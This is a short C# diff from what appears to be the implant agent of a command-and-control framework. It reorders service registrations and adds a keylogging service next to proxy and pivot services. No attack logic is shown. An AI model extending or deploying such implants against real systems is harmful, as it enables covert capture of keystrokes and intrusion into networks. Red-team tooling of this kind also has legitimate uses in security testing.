@@ -50,9 +50,10 @@ namespace Agent
 
             ServiceProvider.RegisterSingleton<IMessageService>(new MessageService(metaData));
             ServiceProvider.RegisterSingleton<IFileService>(new FileService());
-            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
 
+            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
             ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
+            ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
 
 
             var commModule = CommunicationFactory.CreateCommunicator(connexion);
